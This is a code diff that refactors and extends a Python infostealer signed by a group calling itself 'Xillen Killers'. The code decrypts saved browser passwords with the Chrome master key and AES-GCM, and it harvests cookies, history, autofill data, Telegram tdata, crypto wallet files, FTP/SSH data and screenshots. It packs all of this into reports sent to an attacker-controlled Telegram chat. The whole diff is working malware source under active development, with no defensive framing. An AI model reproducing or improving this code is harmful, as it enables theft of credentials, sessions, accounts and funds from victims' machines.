@@ -12,7 +12,10 @@ import sqlite3
 import shutil
 import json
 import base64
-from Crypto.Cipher import AES
+# Removed: from Crypto.Cipher import AES - replaced with cryptography
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.primitives import padding
+from cryptography.hazmat.backends import default_backend
 from glob import glob
 import tempfile
 import subprocess
@@ -32,6 +35,8 @@ import array
 import mmap
 import select
 import pathlib
+import socket
+from PIL import ImageGrab # Assuming Pillow is installed
 
 # Global configuration and utilities
 config = None   # Will be initialized later
@@ -63,18 +68,65 @@ def getchromemasterkey():
         with open(localstatepath, 'r', encoding='utf-8') as f:
             localstate = json.load(f)
 
-        encryptedkey = base64.b64decode(localstate.get('os_crypt', {}).get('encrypted_key', ''))
-        encryptedkey = encryptedkey[5:]   # Remove the DPAPI prefix
+        encrypted_key_base64 = localstate.get('os_crypt', {}).get('encrypted_key', '')
+        if not encrypted_key_base64:
+            log("Encrypted key not found in Local State.")
+            return None
+
+        encrypted_key = base64.b64decode(encrypted_key_base64)
+        # Remove the DPAPI prefix if present (common on Windows)
+        if encrypted_key.startswith(b'DPAPI'):
+            encrypted_key = encrypted_key[5:]
 
         try:
+            # Using win32crypt for Windows DPAPI decryption
             import win32crypt
-            masterkey = win32crypt.CryptUnprotectData(encryptedkey, None, None, None, 0)[1]
+            masterkey = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
             return masterkey
         except ImportError:
-            log("win32crypt module not found. Chrome password decryption will not work.")
+            log("win32crypt module not found. Chrome password decryption will not work on Windows.")
+            # For non-Windows systems or if win32crypt is unavailable, a fallback might be needed if Chrome uses a different mechanism.
+            # For simplicity, we'll return None if win32crypt is missing on Windows.
+            return None
+        except Exception as dpapi_err:
+            log(f"Error decrypting DPAPI key: {dpapi_err}")
             return None
     except Exception as e:
         log(f"Error retrieving Chrome master key: {e}")
+        return None
+
+def decrypt_aes_gcm(ciphertext, key):
+    """Decrypts data using AES-GCM."""
+    try:
+        # GCM expects nonce to be 12 bytes
+        nonce = ciphertext[3:15]
+        encrypted_data = ciphertext[15:-16]
+        tag = ciphertext[-16:]
+        cipher = Cipher(algorithms.AES(key), modes.GCM(nonce), backend=default_backend())
+        decryptor = cipher.decryptor()
+        decryptor.authenticate_additional_data(b'') # No AAD for this case
+        plaintext = decryptor.update(encrypted_data) + decryptor.finalize_with_tag(tag)
+        return plaintext
+    except Exception as e:
+        log(f"AES-GCM decryption failed: {e}")
+        return None
+
+def decrypt_aes_cbc(ciphertext, key):
+    """Decrypts data using AES-CBC with PKCS7 padding."""
+    try:
+        iv = ciphertext[3:15] # Assuming IV is at this position
+        encrypted_data = ciphertext[15:]
+
+        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
+        decryptor = cipher.decryptor()
+        plaintext_padded = decryptor.update(encrypted_data) + decryptor.finalize()
+
+        # Unpad PKCS7
+        unpadder = padding.PKCS7(algorithms.AES(key).block_size).unpadder()
+        plaintext = unpadder.update(plaintext_padded) + unpadder.finalize()
+        return plaintext
+    except Exception as e:
+        log(f"AES-CBC decryption failed: {e}")
         return None
 
 def decryptchromepassword(ciphertext, masterkey):
@@ -86,39 +138,47 @@ def decryptchromepassword(ciphertext, masterkey):
 
     try:
         # Chrome uses different encryption versions, handle common ones
+        # Version 10/11: AES-GCM
         if ciphertext.startswith(b'v10') or ciphertext.startswith(b'v11'):
-            nonce = ciphertext[3:15]
-            encrypteddata = ciphertext[15:-16]
-            tag = ciphertext[-16:]
-            cipher = AES.new(masterkey, AES.MODE_GCM, nonce=nonce)
-            plaintext = cipher.decrypt_and_verify(encrypteddata, tag)
+            plaintext = decrypt_aes_gcm(ciphertext, masterkey)
+            if plaintext:
+                return plaintext.decode('utf-8', errors='replace')
+            else:
+                return "[DECRYPTIONFAILED_GCM]"
         else:
-            # Attempt a simpler AES decryption if no clear version is found
-            # This part might need adjustment based on specific encryption schemes
-            try:
-                iv = ciphertext[3:15]  # Assuming IV is at this position for some older versions
-                payload = ciphertext[15:]
-                cipher = AES.new(masterkey, AES.MODE_CBC, iv) # Trying CBC as another common mode
-                plaintext = cipher.decrypt(payload)
-            except Exception as aese:
-                log(f"Failed to decrypt with common AES modes: {aese}")
-                return "[DECRYPTIONFAILED]"
-
-        # Remove padding if present (common in older AES implementations)
-        # This part might need adjustment based on specific padding schemes
-        paddinglen = plaintext[-1]
-        if paddinglen > 0 and paddinglen <= 16:
-            try:
-                if all(plaintext[-(i+1)] == paddinglen for i in range(paddinglen)):
-                    plaintext = plaintext[:-paddinglen]
-            except IndexError:
-                pass  # Padding might not be as expected
-
-        return plaintext.decode('utf-8', errors='replace')
+            # Attempt AES-CBC decryption as a fallback
+            plaintext = decrypt_aes_cbc(ciphertext, masterkey)
+            if plaintext:
+                return plaintext.decode('utf-8', errors='replace')
+            else:
+                return "[DECRYPTIONFAILED_CBC]"
 
     except Exception as e:
         log(f"Error decrypting Chrome password: {e}")
         return "[DECRYPTIONERROR]"
+
+def copy_db_and_connect(dbpath):
+    """Copies a SQLite DB to a temporary location and returns a connection."""
+    if not os.path.exists(dbpath):
+        return None, None
+    try:
+        tempdbpath = os.path.join(tempfile.gettempdir(), f"{os.path.basename(dbpath)}_{random.randint(1000, 9999)}.db")
+        shutil.copy2(dbpath, tempdbpath)
+        conn = sqlite3.connect(tempdbpath)
+        return conn, tempdbpath
+    except Exception as e:
+        log(f"Failed to copy or connect to DB {dbpath}: {e}")
+        return None, None
+
+def close_db_connection(conn, tempdbpath):
+    """Closes the SQLite connection and removes the temporary file."""
+    if conn:
+        conn.close()
+    if tempdbpath and os.path.exists(tempdbpath):
+        try:
+            os.remove(tempdbpath)
+        except Exception as e:
+            log(f"Failed to remove temporary DB file {tempdbpath}: {e}")
 
 def collectbrowserpasswords():
     """Collects passwords from Chrome and Edge browsers."""
@@ -130,12 +190,9 @@ def collectbrowserpasswords():
     masterkey = getchromemasterkey()
 
     for browsername, dbpath in browsers.items():
-        if os.path.exists(dbpath):
+        conn, tempdbpath = copy_db_and_connect(dbpath)
+        if conn:
             try:
-                # Copy the database to avoid locking issues
-                tempdbpath = os.path.join(tempfile.gettempdir(), f"{browsername}LoginData{random.randint(1000, 9999)}.db")
-                shutil.copy2(dbpath, tempdbpath)
-                conn = sqlite3.connect(tempdbpath)
                 cursor = conn.cursor()
                 cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                 for url, username, passwordencrypted in cursor.fetchall():
@@ -147,10 +204,10 @@ def collectbrowserpasswords():
                             'password': decryptedpassword,
                             'browser': browsername
                         })
-                conn.close()
-                os.remove(tempdbpath)
             except Exception as e:
                 log(f"Error processing {browsername} login data: {e}")
+            finally:
+                close_db_connection(conn, tempdbpath)
 
     # Firefox passwords
     firefoxprofilespath = os.path.join(os.environ.get('APPDATA', ''), 'Mozilla', 'Firefox', 'Profiles')
@@ -162,11 +219,24 @@ def collectbrowserpasswords():
                     try:
                         with open(loginsfile, 'r', encoding='utf-8') as f:
                             data = json.load(f)
+                            # Firefox passwords in logins.json are typically base64 encoded but not master-key encrypted by default in the file itself.
+                            # The actual decryption happens within Firefox. We'll attempt to decode if it looks like base64.
                             for login in data.get('logins', []):
+                                password_raw = login.get('password', '[ENCRYPTED]')
+                                if isinstance(password_raw, str) and len(password_raw) > 10 and all(c in string.ascii_letters + string.digits + '+/=' for c in password_raw):
+                                    try:
+                                        # Attempt to decode as base64, might not always be the case
+                                        decoded_password = base64.b64decode(password_raw).decode('utf-8', errors='replace')
+                                        password_to_add = decoded_password
+                                    except:
+                                        password_to_add = password_raw # Keep as is if not decodable base64
+                                else:
+                                    password_to_add = password_raw
+
                                 passwords.append({
                                     'url': login.get('hostname', ''),
                                     'username': login.get('username', ''),
-                                    'password': login.get('password', '[ENCRYPTED]'),  # Firefox passwords are not typically encrypted by default in the file
+                                    'password': password_to_add,
                                     'browser': 'Firefox'
                                 })
                     except Exception as e:
@@ -182,11 +252,9 @@ def collectbrowsercookies():
     }
 
     for browsername, dbpath in browsers.items():
-        if os.path.exists(dbpath):
+        conn, tempdbpath = copy_db_and_connect(dbpath)
+        if conn:
             try:
-                tempdbpath = os.path.join(tempfile.gettempdir(), f"{browsername}Cookies{random.randint(1000, 9999)}.db")
-                shutil.copy2(dbpath, tempdbpath)
-                conn = sqlite3.connect(tempdbpath)
                 cursor = conn.cursor()
                 # Adjust query for relevant columns, add secure/httponly if available
                 cursor.execute("SELECT name, value, domain_name, path, expires_utc, is_secure, is_httponly FROM cookies")
@@ -201,10 +269,10 @@ def collectbrowsercookies():
                         'httponly': bool(httponly),
                         'browser': browsername
                     })
-                conn.close()
-                os.remove(tempdbpath)
             except Exception as e:
                 log(f"Error processing {browsername} cookies: {e}")
+            finally:
+                close_db_connection(conn, tempdbpath)
 
     # Firefox cookies
     firefoxprofilespath = os.path.join(os.environ.get('APPDATA', ''), 'Mozilla', 'Firefox', 'Profiles')
@@ -212,9 +280,9 @@ def collectbrowsercookies():
         for profilefolder in os.listdir(firefoxprofilespath):
             if profilefolder.endswith(('.default', '.default-release')):
                 cookiesdb = os.path.join(firefoxprofilespath, profilefolder, 'cookies.sqlite')
-                if os.path.exists(cookiesdb):
+                conn, tempdbpath = copy_db_and_connect(cookiesdb)
+                if conn:
                     try:
-                        conn = sqlite3.connect(cookiesdb)
                         cursor = conn.cursor()
                         cursor.execute("SELECT name, value, host, path, expiry, isSecure, isHttpOnly FROM moz_cookies")
                         for name, value, domain, path, expiry, secure, httponly in cursor.fetchall():
@@ -228,15 +296,17 @@ def collectbrowsercookies():
                                 'httponly': bool(httponly),
                                 'browser': 'Firefox'
                             })
-                        conn.close()
                     except Exception as e:
                         log(f"Error processing Firefox cookies.sqlite: {e}")
+                    finally:
+                        close_db_connection(conn, tempdbpath)
     return cookies
 
 def collectprocesses():
     """Collects information about running processes."""
     processes = []
     try:
+        # Fetch all process info in one go for potential performance gain
         for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent', 'create_time']):
             try:
                 processes.append({
@@ -259,7 +329,9 @@ def collectconnections():
     """Collects information about network connections."""
     connections = []
     try:
-        for conn in psutil.net_connections(kind='inet'):  # Include IPv4 and IPv6
+        # Fetch all connections once
+        all_connections = psutil.net_connections(kind='inet')
+        for conn in all_connections:
             localaddress = f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else "N/A"
             remoteaddress = f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "N/A"
             connections.append({
@@ -281,18 +353,18 @@ def collectbrowserhistory():
     }
 
     for browsername, dbpath in browsers.items():
-        if os.path.exists(dbpath):
+        conn, tempdbpath = copy_db_and_connect(dbpath)
+        if conn:
             try:
-                tempdbpath = os.path.join(tempfile.gettempdir(), f"{browsername}History{random.randint(1000, 9999)}.db")
-                shutil.copy2(dbpath, tempdbpath)
-                conn = sqlite3.connect(tempdbpath)
                 cursor = conn.cursor()
                 # Fetching more relevant fields and ordering by visit time
-                cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
+                # Use a slightly larger limit for potentially more comprehensive results
+                cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 150")
                 for url, title, visitcount, lastvisittime in cursor.fetchall():
                     # Convert lastvisittime from Chrome's format (microseconds since epoch)
                     try:
-                        visittimeiso = datetime.fromtimestamp(lastvisittime / 1000000).isoformat() if lastvisittime else None
+                        # Ensure lastvisittime is not zero or None before conversion
+                        visittimeiso = datetime.fromtimestamp(lastvisittime / 1000000).isoformat() if lastvisittime and lastvisittime > 0 else None
                     except:
                         visittimeiso = None
                     history.append({
@@ -302,10 +374,10 @@ def collectbrowserhistory():
                         'lastvisit': visittimeiso,
                         'browser': browsername
                     })
-                conn.close()
-                os.remove(tempdbpath)
             except Exception as e:
                 log(f"Error processing {browsername} history: {e}")
+            finally:
+                close_db_connection(conn, tempdbpath)
     return history
 
 def collectautofilldata():
@@ -317,17 +389,15 @@ def collectautofilldata():
     }
 
     for browsername, dbpath in browsers.items():
-        if os.path.exists(dbpath):
+        conn, tempdbpath = copy_db_and_connect(dbpath)
+        if conn:
             try:
-                tempdbpath = os.path.join(tempfile.gettempdir(), f"{browsername}WebData{random.randint(1000, 9999)}.db")
-                shutil.copy2(dbpath, tempdbpath)
-                conn = sqlite3.connect(tempdbpath)
                 cursor = conn.cursor()
                 # Fetching relevant autofill data
-                cursor.execute("SELECT name, value, date_created FROM autofill ORDER BY date_created DESC LIMIT 50")
+                cursor.execute("SELECT name, value, date_created FROM autofill ORDER BY date_created DESC LIMIT 100") # Increased limit
                 for name, value, datecreated in cursor.fetchall():
                     try:
-                        datecreatediso = datetime.fromtimestamp(datecreated / 1000000).isoformat() if datecreated else None
+                        datecreatediso = datetime.fromtimestamp(datecreated / 1000000).isoformat() if datecreated and datecreated > 0 else None
                     except:
                         datecreatediso = None
                     autofill.append({
@@ -336,10 +406,10 @@ def collectautofilldata():
                         'datecreated': datecreatediso,
                         'browser': browsername
                     })
-                conn.close()
-                os.remove(tempdbpath)
             except Exception as e:
                 log(f"Error processing {browsername} autofill data: {e}")
+            finally:
+                close_db_connection(conn, tempdbpath)
     return autofill
 
 def sendtelegramreport(collecteddata, language='ru'):
@@ -383,13 +453,13 @@ def sendtelegramreport(collecteddata, language='ru'):
         }
         langcaptions = captions.get(language, captions['ru'])  # Default to Russian if language not found
 
-        # Generate HTML report (placeholder - actual generation logic needed)
+        # Generate HTML report
         htmlreportcontent = generatehtmlreportv4(collecteddata, language)
         htmlreportpath = os.path.join(tempfile.gettempdir(), "report.html")
         with open(htmlreportpath, "w", encoding="utf-8") as f:
             f.write(htmlreportcontent)
 
-        # Generate TXT report (placeholder - actual generation logic needed)
+        # Generate TXT report
         txtreportcontent = generatetxtreportv4(collecteddata, language)
         txtreportpath = os.path.join(tempfile.gettempdir(), "report.txt")
         with open(txtreportpath, "w", encoding="utf-8") as f:
@@ -399,6 +469,7 @@ def sendtelegramreport(collecteddata, language='ru'):
         screenshotpath = None
         try:
             screenshotpath = os.path.join(tempfile.gettempdir(), "screen.jpg")
+            # Use ImageGrab for screenshot, ensure Pillow is installed
             img = ImageGrab.grab()
             img.save(screenshotpath)
             log("Screenshot captured.")
@@ -409,8 +480,9 @@ def sendtelegramreport(collecteddata, language='ru'):
         htmlcaption = f"{langcaptions['htmltitle']}\n\n{langcaptions['signature']}"
         try:
             with open(htmlreportpath, "rb") as reportfile:
-                bot.send_document(config.TGCHATID, reportfile, caption=htmlcaption)
-            log(f"HTML report sent to Telegram ID: {config.TGCHATID}")
+                if bot:
+                    bot.send_document(config.TGCHATID, reportfile, caption=htmlcaption)
+                log(f"HTML report to Telegram ID: {config.TGCHATID}")
         except Exception as e:
             log(f"Error sending HTML report to Telegram: {e}")
 
@@ -418,8 +490,9 @@ def sendtelegramreport(collecteddata, language='ru'):
         txtcaption = f"{langcaptions['txttitle']}\n\n{langcaptions['signature']}"
         try:
             with open(txtreportpath, "rb") as txtfile:
-                bot.send_document(config.TGCHATID, txtfile, caption=txtcaption)
-            log(f"TXT report sent to Telegram ID: {config.TGCHATID}")
+                if bot:
+                    bot.send_document(config.TGCHATID, txtfile, caption=txtcaption)
+                log(f"TXT report to Telegram ID: {config.TGCHATID}")
         except Exception as e:
             log(f"Error sending TXT report to Telegram: {e}")
 
@@ -428,8 +501,9 @@ def sendtelegramreport(collecteddata, language='ru'):
             screenshotcaption = f"{langcaptions['screenshottitle']}\n\n{langcaptions['signature']}"
             try:
                 with open(screenshotpath, "rb") as photo:
-                    bot.send_photo(config.TGCHATID, photo, caption=screenshotcaption)
-                log(f"Screenshot sent to Telegram ID: {config.TGCHATID}")
+                    if bot:
+                        bot.send_photo(config.TGCHATID, photo, caption=screenshotcaption)
+                    log(f"Screenshot sent to Telegram ID: {config.TGCHATID}")
             except Exception as e:
                 log(f"Error sending screenshot to Telegram: {e}")
 
@@ -441,9 +515,10 @@ def sendtelegramreport(collecteddata, language='ru'):
                     archivecaption = f"Telegram tdata archive {i}/{len(tdataarchives)}\n\n{langcaptions['signature']}"
                     try:
                         with open(archivepath, "rb") as archivefile:
-                            bot.send_document(config.TGCHATID, archivefile, caption=archivecaption)
-                        log(f"Telegram tdata archive {i} sent successfully.")
-                        os.remove(archivepath)  # Clean up archive after sending
+                            if bot:
+                                bot.send_document(config.TGCHATID, archivefile, caption=archivecaption)
+                            log(f"Telegram tdata archive {i} sent successfully.")
+                            os.remove(archivepath)  # Clean up archive after sending
                     except Exception as e:
                         log(f"Error sending Telegram tdata archive {i}: {e}")
 
@@ -459,6 +534,7 @@ def sendtelegramreport(collecteddata, language='ru'):
 
     except Exception as e:
         log(f"Critical error during Telegram report sending: {e}")
+        log(traceback.format_exc())
 
 
 # Placeholder functions for report generation (replace with actual implementations)
@@ -498,6 +574,8 @@ def generatehtmlreportv4(collecteddata, language):
             th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
             th {{ background-color: #f2f2f2; }}
             .signature {{ font-size: 0.8em; color: #888; margin-top: 30px; }}
+            .data-item {{ margin-bottom: 10px; }}
+            .data-item strong {{ display: block; margin-bottom: 5px; }}
         </style>
     </head>
     <body>
@@ -533,6 +611,37 @@ def generatehtmlreportv4(collecteddata, language):
         <h2>Network Connections</h2>
         {formatconnectiontable(collecteddata.get('networkconnections', []))}
 
+        <h2>Configuration Files</h2>
+        <div class="data-container">
+            {''.join(f"<div class='data-item'><strong>{item.splitlines()[0]}</strong><pre>{'\\n'.join(item.splitlines()[1:])}</pre></div>" for item in collecteddata.get('configfiles', [])) if collecteddata.get('configfiles') else "<p>No configuration files found.</p>"}
+        </div>
+
+        <h2>FTP/SSH Client Data</h2>
+        <div class="data-container">
+            {''.join(f"<div class='data-item'><strong>{item.splitlines()[0]}</strong><pre>{'\\n'.join(item.splitlines()[1:])}</pre></div>" for item in collecteddata.get('ftpsshclients', [])) if collecteddata.get('ftpsshclients') else "<p>No FTP/SSH client data found.</p>"}
+        </div>
+
+        <h2>Database Files</h2>
+        <div class="data-container">
+            {formatdatabaseinfo(collecteddata.get('databases', [])) if collecteddata.get('databases') else "<p>No database files found.</p>"}
+        </div>
+
+        <h2>Backup Files</h2>
+        <div class="data-container">
+            {formatbackupinfo(collecteddata.get('backups', [])) if collecteddata.get('backups') else "<p>No backup files found.</p>"}
+        </div>
+
+        <h2>Telegram tdata Archives</h2>
+        <div class="data-container">
+            {formatarchiveinfo(collecteddata.get('telegramtdata', [])) if collecteddata.get('telegramtdata') else "<p>No Telegram tdata archives found.</p>"}
+        </div>
+
+        <h2>Cryptocurrency Wallets</h2>
+        <div class="data-container">
+            {''.join(f"<div class='data-item'><strong>{item.splitlines()[0]}</strong><pre>{'\\n'.join(item.splitlines()[1:])}</pre></div>" for item in collecteddata.get('cryptowallets', [])) if collecteddata.get('cryptowallets') else "<p>No cryptocurrency wallet data found.</p>"}
+        </div>
+
+
         <p class="signature">{template['signature']}</p>
     </body>
     </html>
@@ -550,6 +659,11 @@ def generatetxtreportv4(collecteddata, language):
             'wallets': 'Крипто-кошельки:',
             'processes': 'Процессы:',
             'connections': 'Сетевые соединения:',
+            'configs': 'Конфигурационные файлы:',
+            'ftpssh': 'Данные FTP/SSH клиентов:',
+            'databases': 'Базы данных:',
+            'backups': 'Резервные копии:',
+            'telegramtdata': 'Архивы Telegram tdata:',
             'signature': 'Создано командой Xillen Killers (t.me/XillenAdapter) | https://github.com/BengaminButton'
         },
         'en': {
@@ -560,6 +674,11 @@ def generatetxtreportv4(collecteddata, language):
             'wallets': 'Crypto Wallets:',
             'processes': 'Processes:',
             'connections': 'Network Connections:',
+            'configs': 'Configuration Files:',
+            'ftpssh': 'FTP/SSH Client Data:',
+            'databases': 'Database Files:',
+            'backups': 'Backup Files:',
+            'telegramtdata': 'Telegram tdata Archives:',
             'signature': 'Created by Xillen Killers team (t.me/XillenAdapter) | https://github.com/BengaminButton'
         }
     }
@@ -611,6 +730,64 @@ def generatetxtreportv4(collecteddata, language):
             report += f"  Local: {conn.get('localaddress', 'N/A')}, Remote: {conn.get('remoteaddress', 'N/A')}, Status: {conn.get('status', 'N/A')}\n"
     report += "\n"
 
+    report += f"{template['configs']}\n"
+    configs = collecteddata.get('configfiles', [])
+    if configs:
+        for cfg in configs[:5]: # Limit for brevity
+            lines = cfg.splitlines()
+            report += f"  File: {lines[0]}\n  Content:\n    " + "\n    ".join(lines[1:]) + "\n"
+    else:
+        report += "  No configuration files found.\n"
+    report += "\n"
+
+    report += f"{template['ftpssh']}\n"
+    ftpssh = collecteddata.get('ftpsshclients', [])
+    if ftpssh:
+        for client in ftpssh[:5]: # Limit for brevity
+            lines = client.splitlines()
+            report += f"  Client: {lines[0]}\n  Content:\n    " + "\n    ".join(lines[1:]) + "\n"
+    else:
+        report += "  No FTP/SSH client data found.\n"
+    report += "\n"
+
+    report += f"{template['databases']}\n"
+    databases = collecteddata.get('databases', [])
+    if databases:
+        for db in databases[:10]: # Limit for brevity
+            report += f"  - {db}\n"
+    else:
+        report += "  No database files found.\n"
+    report += "\n"
+
+    report += f"{template['backups']}\n"
+    backups = collecteddata.get('backups', [])
+    if backups:
+        for backup in backups[:10]: # Limit for brevity
+            report += f"  - {backup}\n"
+    else:
+        report += "  No backup files found.\n"
+    report += "\n"
+
+    report += f"{template['telegramtdata']}\n"
+    tdata_archives = collecteddata.get('telegramtdata', [])
+    if tdata_archives:
+        for i, archive_path in enumerate(tdata_archives):
+            report += f"  - Archive {i+1}: {os.path.basename(archive_path)}\n"
+    else:
+        report += "  No Telegram tdata archives found.\n"
+    report += "\n"
+
+    report += f"{template['wallets']}\n"
+    wallets = collecteddata.get('cryptowallets', [])
+    if wallets:
+        for wallet_info in wallets[:5]: # Limit for brevity
+            lines = wallet_info.splitlines()
+            report += f"  File: {lines[0]}\n  Content (Base64):\n    " + "\n    ".join(lines[1:]) + "\n"
+    else:
+        report += "  No cryptocurrency wallet data found.\n"
+    report += "\n"
+
+
     report += f"{template['signature']}\n"
     return report
 
@@ -619,7 +796,12 @@ def formatpasswordtable(passwords):
     if not passwords: return "<p>No passwords found.</p>"
     html = "<table><tr><th>URL</th><th>Username</th><th>Password</th><th>Browser</th></tr>"
     for pw in passwords:
-        html += f"<tr><td>{pw.get('url', 'N/A')}</td><td>{pw.get('username', 'N/A')}</td><td>{pw.get('password', 'N/A')}</td><td>{pw.get('browser', 'N/A')}</td></tr>"
+        # Basic HTML escaping for safety, though values are usually plain text
+        url = html_escape(pw.get('url', 'N/A'))
+        username = html_escape(pw.get('username', 'N/A'))
+        password = html_escape(pw.get('password', 'N/A'))
+        browser = html_escape(pw.get('browser', 'N/A'))
+        html += f"<tr><td>{url}</td><td>{username}</td><td>{password}</td><td>{browser}</td></tr>"
     html += "</table>"
     return html
 
@@ -627,7 +809,15 @@ def formatcookietable(cookies):
     if not cookies: return "<p>No cookies found.</p>"
     html = "<table><tr><th>Domain</th><th>Name</th><th>Value</th><th>Path</th><th>Expires</th><th>Secure</th><th>HTTPOnly</th><th>Browser</th></tr>"
     for cookie in cookies:
-        html += f"<tr><td>{cookie.get('domain', 'N/A')}</td><td>{cookie.get('name', 'N/A')}</td><td>{cookie.get('value', 'N/A')}</td><td>{cookie.get('path', 'N/A')}</td><td>{cookie.get('expiresutc') or cookie.get('expiry', 'N/A')}</td><td>{cookie.get('secure', False)}</td><td>{cookie.get('httponly', False)}</td><td>{cookie.get('browser', 'N/A')}</td></tr>"
+        domain = html_escape(cookie.get('domain', 'N/A'))
+        name = html_escape(cookie.get('name', 'N/A'))
+        value = html_escape(cookie.get('value', 'N/A'))
+        path = html_escape(cookie.get('path', 'N/A'))
+        expires = cookie.get('expiresutc') or cookie.get('expiry', 'N/A')
+        secure = cookie.get('secure', False)
+        httponly = cookie.get('httponly', False)
+        browser = html_escape(cookie.get('browser', 'N/A'))
+        html += f"<tr><td>{domain}</td><td>{name}</td><td>{value}</td><td>{path}</td><td>{expires}</td><td>{secure}</td><td>{httponly}</td><td>{browser}</td></tr>"
     html += "</table>"
     return html
 
@@ -635,7 +825,12 @@ def formathistorytable(history):
     if not history: return "<p>No history found.</p>"
     html = "<table><tr><th>URL</th><th>Title</th><th>Visits</th><th>Last Visit</th><th>Browser</th></tr>"
     for hist in history:
-        html += f"<tr><td>{hist.get('url', 'N/A')}</td><td>{hist.get('title', 'N/A')}</td><td>{hist.get('visitcount', 'N/A')}</td><td>{hist.get('lastvisit', 'N/A')}</td><td>{hist.get('browser', 'N/A')}</td></tr>"
+        url = html_escape(hist.get('url', 'N/A'))
+        title = html_escape(hist.get('title', 'N/A'))
+        visitcount = hist.get('visitcount', 'N/A')
+        lastvisit = hist.get('lastvisit', 'N/A')
+        browser = html_escape(hist.get('browser', 'N/A'))
+        html += f"<tr><td>{url}</td><td>{title}</td><td>{visitcount}</td><td>{lastvisit}</td><td>{browser}</td></tr>"
     html += "</table>"
     return html
 
@@ -643,7 +838,11 @@ def formatautofilltable(autofill):
     if not autofill: return "<p>No autofill data found.</p>"
     html = "<table><tr><th>Name</th><th>Value</th><th>Date Created</th><th>Browser</th></tr>"
     for af in autofill:
-        html += f"<tr><td>{af.get('name', 'N/A')}</td><td>{af.get('value', 'N/A')}</td><td>{af.get('datecreated', 'N/A')}</td><td>{af.get('browser', 'N/A')}</td></tr>"
+        name = html_escape(af.get('name', 'N/A'))
+        value = html_escape(af.get('value', 'N/A'))
+        datecreated = af.get('datecreated', 'N/A')
+        browser = html_escape(af.get('browser', 'N/A'))
+        html += f"<tr><td>{name}</td><td>{value}</td><td>{datecreated}</td><td>{browser}</td></tr>"
     html += "</table>"
     return html
 
@@ -651,7 +850,13 @@ def formatprocesstable(processes):
     if not processes: return "<p>No processes found.</p>"
     html = "<table><tr><th>PID</th><th>Name</th><th>Username</th><th>CPU (%)</th><th>Memory (%)</th><th>Created</th></tr>"
     for proc in processes:
-        html += f"<tr><td>{proc.get('pid', 'N/A')}</td><td>{proc.get('name', 'N/A')}</td><td>{proc.get('username', 'N/A')}</td><td>{proc.get('cpupercent', 'N/A')}</td><td>{proc.get('memorypercent', 'N/A')}</td><td>{proc.get('createtime', 'N/A')}</td></tr>"
+        pid = html_escape(str(proc.get('pid', 'N/A')))
+        name = html_escape(proc.get('name', 'N/A'))
+        username = html_escape(proc.get('username', 'N/A'))
+        cpupercent = html_escape(str(proc.get('cpupercent', 'N/A')))
+        memorypercent = html_escape(str(proc.get('memorypercent', 'N/A')))
+        createtime = html_escape(proc.get('createtime', 'N/A'))
+        html += f"<tr><td>{pid}</td><td>{name}</td><td>{username}</td><td>{cpupercent}</td><td>{memorypercent}</td><td>{createtime}</td></tr>"
     html += "</table>"
     return html
 
@@ -659,9 +864,41 @@ def formatconnectiontable(connections):
     if not connections: return "<p>No network connections found.</p>"
     html = "<table><tr><th>Local Address</th><th>Remote Address</th><th>Status</th><th>PID</th></tr>"
     for conn in connections:
-        html += f"<tr><td>{conn.get('localaddress', 'N/A')}</td><td>{conn.get('remoteaddress', 'N/A')}</td><td>{conn.get('status', 'N/A')}</td><td>{conn.get('pid', 'N/A')}</td></tr>"
+        localaddress = html_escape(conn.get('localaddress', 'N/A'))
+        remoteaddress = html_escape(conn.get('remoteaddress', 'N/A'))
+        status = html_escape(conn.get('status', 'N/A'))
+        pid = html_escape(str(conn.get('pid', 'N/A')))
+        html += f"<tr><td>{localaddress}</td><td>{remoteaddress}</td><td>{status}</td><td>{pid}</td></tr>"
     html += "</table>"
     return html
+
+def formatdatabaseinfo(databases):
+    if not databases: return "<p>No database files found.</p>"
+    html = "<div class='data-list'>"
+    for db_info in databases:
+        html += f"<div class='data-item'><strong>{html_escape(db_info)}</strong></div>"
+    html += "</div>"
+    return html
+
+def formatbackupinfo(backups):
+    if not backups: return "<p>No backup files found.</p>"
+    html = "<div class='data-list'>"
+    for backup_info in backups:
+        html += f"<div class='data-item'><strong>{html_escape(backup_info)}</strong></div>"
+    html += "</div>"
+    return html
+
+def formatarchiveinfo(archives):
+    if not archives: return "<p>No Telegram tdata archives found.</p>"
+    html = "<div class='data-list'>"
+    for archive_path in archives:
+        html += f"<div class='data-item'><strong>{html_escape(os.path.basename(archive_path))}</strong></div>"
+    html += "</div>"
+    return html
+
+def html_escape(text):
+    """Basic HTML escaping for strings."""
+    return text.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&#39;')
 
 # --- Placeholder Classes and Functions (to be implemented or integrated) ---
 # These classes are defined in the original code but their methods are not fully implemented
@@ -775,7 +1012,7 @@ class TelegramDataCollector:
             if os.path.exists(tdatapath) and os.path.isdir(tdatapath):
                 log(f"Found Telegram tdata at: {tdatapath}")
                 try:
-                    archivename = f"telegramtdata{random.randint(1000, 9999)}.zip"
+                    archivename = f"telegramtdata_{random.randint(1000, 9999)}.zip"
                     archivepath = os.path.join(tempfile.gettempdir(), archivename)
                     with zipfile.ZipFile(archivepath, 'w', zipfile.ZIP_DEFLATED) as zipf:
                         for root, _, files in os.walk(tdatapath):
@@ -811,7 +1048,7 @@ class AdvancedConfig:
             'chromium': ['Chrome', 'Chromium', 'Edge', 'Brave', 'Vivaldi', 'Opera', 'Yandex', 'Slimjet',
                         'Comodo', 'SRWare', 'Torch', 'Blisk', 'Epic', 'Uran', 'Centaury', 'Falkon', 'Superbird',
                         'CocCoc', 'QQBrowser', '360Chrome', 'Sogou', 'Liebao', 'Qihu', 'Maxthon', 'SalamWeb',
-                        'Arc', 'Sidekick', 'SigmaOS', 'Floorp', 'LibreWolf', 'Ghost Browser', 'Konqueror',  # Removed duplicate Falkon
